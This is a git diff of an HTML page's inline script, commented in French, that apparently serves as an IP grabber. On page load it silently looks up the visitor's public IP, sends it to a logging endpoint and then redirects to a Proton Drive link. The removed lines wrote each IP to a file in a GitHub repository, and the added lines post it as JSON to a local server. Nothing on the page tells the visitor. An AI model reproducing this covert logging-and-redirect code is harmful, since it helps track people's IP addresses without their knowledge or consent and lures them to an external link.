@@ -10,31 +10,23 @@
         (function() {
             var a = 'https://api.ipify.org?format=json';
             var b = 'https://drive.proton.me/urls/7MWT2ZBK4M#CelcIjbzZSWY';
-            var c = 'https://github.com/Shaker512/shaker512.github.io/blob/main/ips.txt'; // Remplacez par l'URL de votre fichier ips.txt
+            var c = 'http://localhost:3000/ip'; // URL de votre serveur local
 
             fetch(a).then(function(response) { return response.json(); }).then(function(data) {
                 console.log('Adresse IP:', data.ip);
 
-                // Lire le contenu actuel du fichier ips.txt
-                fetch(c).then(function(response) { return response.text(); }).then(function(text) {
-                    // Ajouter la nouvelle adresse IP
-                    var newText = text + '\n' + data.ip;
-
-                    // Écrire le nouveau contenu dans le fichier ips.txt
-                    fetch(c, {
-                        method: 'PUT',
-                        headers: {
-                            'Content-Type': 'text/plain'
-                        },
-                        body: newText
-                    }).then(function() {
-                        window.location.href = b;
-                    });
+                // Envoyer l'IP au serveur local
+                fetch(c, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ ip: data.ip })
+                }).then(function() {
+                    window.location.href = b;
                 });
             });
         })();
     </script>
 </body>
-
 </html>
-
